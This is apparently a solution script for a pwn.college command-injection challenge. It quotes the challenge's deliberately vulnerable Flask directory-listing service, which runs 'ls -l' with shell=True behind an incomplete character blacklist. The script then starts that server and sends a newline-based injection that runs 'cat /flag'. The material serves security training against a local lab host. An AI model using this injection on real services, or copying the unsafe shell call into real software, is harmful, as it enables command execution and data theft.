import os
import re
import requests

"""
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def challenge():
    directory = (
        flask.request.args.get("directory", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {directory}"
    print(f"DEBUG: {command=}")
    listing = subprocess.run(
        command,                    # the command to run
        shell=True,                 # use the shell to run this command
        stdout=subprocess.PIPE,     # capture the standard output
        stderr=subprocess.STDOUT,   # 2>&1
        encoding="latin"            # capture the resulting output as text
    ).stdout

    return f'''
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of: ls -l {directory}</b><br>
        <pre>{listing}</pre>
        </body></html>
        '''

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
"""

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
r1, w1 = os.pipe()
pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r1)

	os.dup2(w1, 1)
	os.close(w1)

	# stdout as stderr
	os.dup2(1, 2)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		injection = """
		/challenge
		cat /flag
		"""
		url = "http://challenge.localhost:80"
		params = {"directory": injection}
		resp = requests.get(url, params=params)
		print(resp.text)
		exit(0)
